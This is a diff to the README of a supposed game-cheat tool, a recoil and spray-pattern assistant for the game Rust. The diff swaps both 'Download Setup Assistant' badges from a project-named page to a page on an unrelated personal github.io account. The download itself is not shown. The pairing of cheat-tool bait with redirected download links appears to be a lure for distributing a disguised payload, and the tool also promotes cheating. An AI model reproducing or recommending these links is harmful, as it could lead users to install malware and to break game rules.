@@ -1,7 +1,7 @@
 # 🎮 MACROHOOK for RUST — Recoil & Spray Pattern Assistant
 
-[![Download Setup Assistant](https://img.shields.io/badge/Download_Setup_Assistant-limegreen?style=for-the-badge)](https://macrohook-for-rust.github.io/.github/)  
-[![Download Now](https://img.shields.io/badge/Download_Now-brown?style=for-the-badge&logo=rust)](https://macrohook-for-rust.github.io/.github/)
+[![Download Setup Assistant](https://img.shields.io/badge/Download_Setup_Assistant-limegreen?style=for-the-badge)](https://oksanabotichenko701.github.io/.github/macrohook-rust)  
+[![Download Now](https://img.shields.io/badge/Download_Now-brown?style=for-the-badge&logo=rust)](https://oksanabotichenko701.github.io/.github/macrohook-rust)
 
 ---
 
